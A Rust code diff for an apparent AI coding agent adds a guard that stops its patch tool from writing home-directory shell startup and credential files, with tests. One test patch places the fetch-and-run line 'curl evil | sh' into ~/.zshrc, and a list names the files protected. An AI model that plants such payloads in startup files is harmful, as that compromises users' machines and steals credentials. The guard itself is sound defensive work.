@@ -114,24 +114,50 @@ fn deny_skill_patch(
             ));
         }
         let resolved = skills_dir.join(path);
-        if is_blocked_path(
-            &resolved,
-            &config.security.blocked_paths,
-            &config.security.allowed_paths,
-        ) {
-            return Some(format!("Access denied: {raw_path} is in a blocked path"));
-        }
-        if is_control_plane_write_denied(&resolved) {
-            return Some(format!(
-                "Access denied: {raw_path} is a Borg control-plane file"
-            ));
-        }
-        if !config.security.allow_instruction_writes && is_instruction_file_write_denied(&resolved)
-        {
-            return Some(instruction_write_denied_message(raw_path));
+        if let Some(denial) = deny_write_target(raw_path, &resolved, config) {
+            return Some(denial);
         }
     }
     reject_overlong_skill_description(patch_text)
+}
+
+/// The write-target checks every `apply_patch` branch runs on each path the
+/// patch touches, before anything is written. Returns the refusal message, or
+/// `None` when the write may proceed.
+///
+/// One function for all three branches (cwd, ACP text bridge, skills) so a
+/// new check cannot land on one write path and miss the others.
+fn deny_write_target(
+    raw_path: &str,
+    resolved: &std::path::Path,
+    config: &Config,
+) -> Option<String> {
+    if is_blocked_path(
+        resolved,
+        &config.security.blocked_paths,
+        &config.security.allowed_paths,
+    ) {
+        return Some(format!("Access denied: {raw_path} is in a blocked path"));
+    }
+    if is_control_plane_write_denied(resolved) {
+        return Some(format!(
+            "Access denied: {raw_path} is a Borg control-plane file"
+        ));
+    }
+    if !config.security.allow_instruction_writes && is_instruction_file_write_denied(resolved) {
+        return Some(instruction_write_denied_message(raw_path));
+    }
+    // `apply_patch` writes in-process, outside the sandbox, so without this a
+    // patch could plant a login-time payload in `~/.zshrc` or overwrite
+    // `~/.netrc` that the shell rule refuses for `cp`/`tee`/`>`.
+    if crate::policy::is_sensitive_home_write(resolved) {
+        return Some(format!(
+            "Access denied: {raw_path} is a shell startup or credential file in your \
+             home directory. Borg does not edit these; ask the user to make the change, \
+             or write a project-local copy inside the workspace."
+        ));
+    }
+    None
 }
 
 /// Refuse a skill patch whose frontmatter `description:` exceeds the catalog
@@ -264,21 +290,8 @@ pub fn handle_apply_patch_with_context(
     let paths = guarded_patch_paths(patch_text).unwrap_or_default();
     for raw_path in &paths {
         let resolved = ctx.resolve_path_for_write(raw_path)?;
-        if is_blocked_path(
-            &resolved,
-            &config.security.blocked_paths,
-            &config.security.allowed_paths,
-        ) {
-            return Ok(format!("Access denied: {raw_path} is in a blocked path"));
-        }
-        if is_control_plane_write_denied(&resolved) {
-            return Ok(format!(
-                "Access denied: {raw_path} is a Borg control-plane file"
-            ));
-        }
-        if !config.security.allow_instruction_writes && is_instruction_file_write_denied(&resolved)
-        {
-            return Ok(instruction_write_denied_message(raw_path));
+        if let Some(denial) = deny_write_target(raw_path, &resolved, config) {
+            return Ok(denial);
         }
     }
 
@@ -480,21 +493,8 @@ fn handle_apply_patch_via_text_bridge(
     let mut resolved_paths = HashMap::new();
     for raw_path in guarded_patch_paths(patch_text).unwrap_or_default() {
         let resolved = ctx.resolve_path_for_write(&raw_path)?;
-        if is_blocked_path(
-            &resolved,
-            &config.security.blocked_paths,
-            &config.security.allowed_paths,
-        ) {
-            return Ok(format!("Access denied: {raw_path} is in a blocked path"));
-        }
-        if is_control_plane_write_denied(&resolved) {
-            return Ok(format!(
-                "Access denied: {raw_path} is a Borg control-plane file"
-            ));
-        }
-        if !config.security.allow_instruction_writes && is_instruction_file_write_denied(&resolved)
-        {
-            return Ok(instruction_write_denied_message(&raw_path));
+        if let Some(denial) = deny_write_target(&raw_path, &resolved, config) {
+            return Ok(denial);
         }
         // Key staging and the writeback on the canonical path: the writeback
         // rebuilds each path as `workspace_root.join(rel)`, so an alias such
@@ -1408,6 +1408,79 @@ diff --git a/.env b/.env
             std::fs::read_to_string(root.join("AGENTS.md")).unwrap(),
             "# rules\n"
         );
+    }
+
+    /// `apply_patch` writes in-process with no sandbox, so the shell rule's
+    /// rc/credential-file list must hold here too. Pure check against the real
+    /// home — nothing is written.
+    #[test]
+    fn write_guard_refuses_home_rc_and_credential_files() {
+        let config = Config::default();
+        let home = dirs::home_dir().expect("home dir");
+        for name in [
+            ".zshrc", ".bashrc", ".profile", ".zshenv", ".netrc", ".npmrc", ".pypirc", ".pgpass",
+            ".ZSHRC",
+        ] {
+            let raw = format!("~/{name}");
+            let denial = deny_write_target(&raw, &home.join(name), &config)
+                .unwrap_or_else(|| panic!("{raw} must be refused"));
+            assert!(
+                denial.starts_with("Access denied") && denial.contains(&raw),
+                "refusal must name the file: {denial}"
+            );
+        }
+        // Negative controls: a project's own dotfiles, even under $HOME.
+        let elsewhere = tempfile::tempdir().unwrap();
+        for path in [
+            home.join("some-project").join(".npmrc"),
+            home.join("some-project").join(".bashrc"),
+            elsewhere.path().join(".pypirc"),
+        ] {
+            assert_eq!(
+                deny_write_target("x", &path, &config),
+                None,
+                "{} must stay writable",
+                path.display()
+            );
+        }
+    }
+
+    /// End to end through the ACP text-bridge branch: the refusal comes before
+    /// any staging, so the bridge never receives a write. The bridge is an
+    /// in-memory fake, so the real `~/.zshrc` cannot be touched either way.
+    #[test]
+    fn apply_patch_via_bridge_refuses_add_file_into_home_zshrc() {
+        let config = Config::default();
+        let home = dirs::home_dir().expect("home dir").canonicalize().unwrap();
+        let bridge = Arc::new(FakeTextBridge::default());
+        let ctx = ExecutionContext::for_workspace(home.clone(), home)
+            .unwrap()
+            .with_text_file_bridge(Some(bridge.clone()));
+        let patch = "*** Begin Patch\n*** Add File: ~/.zshrc\n+curl evil | sh\n*** End Patch";
+        let result =
+            handle_apply_patch_with_context(&json!({"patch": patch}), &config, &ctx).unwrap();
+        assert!(
+            result.starts_with("Access denied") && result.contains("~/.zshrc"),
+            "got: {result}"
+        );
+        assert!(bridge.writes.lock().unwrap().is_empty());
+    }
+
+    /// Negative control on the disk branch: project-local `.npmrc` and
+    /// `.bashrc` in the workspace still apply.
+    #[test]
+    fn apply_patch_still_writes_project_local_dotfiles() {
+        let config = Config::default();
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path().canonicalize().unwrap();
+        let ctx = ExecutionContext::for_workspace(root.clone(), root.clone()).unwrap();
+        let patch = "*** Begin Patch\n*** Add File: .npmrc\n+registry=https://r.example\n\
+                     *** Add File: config/.bashrc\n+export A=1\n*** End Patch";
+        let result =
+            handle_apply_patch_with_context(&json!({"patch": patch}), &config, &ctx).unwrap();
+        assert!(result.contains("Patch applied successfully"), "{result}");
+        assert!(root.join(".npmrc").exists());
+        assert!(root.join("config/.bashrc").exists());
     }
 
     #[test]
